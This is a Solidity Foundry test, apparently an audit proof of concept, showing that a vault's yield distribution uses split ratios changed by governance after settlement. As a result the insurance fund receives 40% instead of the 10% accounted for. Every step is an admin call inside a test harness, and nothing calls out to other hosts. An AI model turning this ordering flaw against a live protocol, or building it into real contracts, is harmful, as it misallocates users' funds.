// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ToL1WeiHarness} from "test/ActionEncoderBoundCheck.t.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deposit and stake to ensure sUSDM has stakers. Mint USDC to yieldEscrow to simulate yield.
// 2. [T=0] Operator calls vault.settle(1000e6) which internally calls Accountant.settleDailyPnL() to declare yield under OLD ratios (80% user, 10% insurance, 10% foundation).
// 3. [T=1] Governance executes config.setYieldBps(5000, 4000) changing insuranceYieldBps from 10% to 40%.
// 4. [T=2] Operator calls vault.distributeYield(). The Vault reads the NEW split ratios from Config when distributing, but the yield was declared under the OLD ratios.
// 5. [Assert] Verify InsuranceFund received 40% (400e6) instead of the 10% (100e6) that was accounted for in the settlement's distributable calculation.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. Setup
        vm.prank(admin);
        config.setYieldBps(8000, 1000); // 80% user, 10% insurance, 10% foundation

        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6); // ensure sUSDM has stakers

        uint256 yieldAmount = 1_000e6;
        usdc.mint(address(yieldEscrow), yieldAmount);

        // 2. Settle yield under OLD ratios
        vm.prank(admin);
        vault.settle(yieldAmount);

        console.log("Step 2: Settled yield =", yieldAmount);
        console.log("Step 2: insuranceYieldBps =", config.insuranceYieldBps());

        // 3. Governance changes yield BPS before distribution
        vm.prank(admin);
        config.setYieldBps(5000, 4000); // 50% user, 40% insurance, 10% foundation

        console.log("Step 3: NEW insuranceYieldBps =", config.insuranceYieldBps());

        // 4. Distribute yield using NEW ratios
        vm.prank(admin);
        vault.distributeYield();

        // 5. Assert the exploit
        // Under OLD ratios, insurance should have received 10% of 1000e6 = 100e6
        // Under NEW ratios, insurance receives 40% of 1000e6 = 400e6
        uint256 insuranceBalance = usdc.balanceOf(address(insurance));
        console.log("Step 5: InsuranceFund balance =", insuranceBalance);

        assertGt(insuranceBalance, 100e6, "InsuranceFund received more than the settled ratio accounted for");
        assertEq(insuranceBalance, 400e6, "InsuranceFund received exactly the new ratio amount");
    }
}
